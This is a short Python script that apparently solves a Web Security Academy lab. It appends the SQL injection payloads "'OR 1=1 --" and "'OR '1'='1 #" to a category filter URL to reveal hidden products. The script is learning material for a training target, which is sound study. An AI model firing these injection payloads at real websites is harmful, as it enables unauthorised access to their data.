#SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
#Accessing all the information from the website
#Solution: Filter you website using Boolean expression and commenting rest of the filter

import requests
url = "https://0aaa005f039cbe95c03fbe9e00ee004e.web-security-academy.net/filter?category=Lifestyle"
#Above url is filtering category of Lifestyle and we will filter all the contents of Category field

boolean_filter=[
    "'OR 1=1 --",
    "'OR '1'='1 #"
]
def retrive_hidden(url):
    for i in boolean_filter:
        r = requests.get(url+i)
        if r.status_code == 200:
            print("FOund!!! {}".format(url+i))
            print(r.text)

retrive_hidden(url)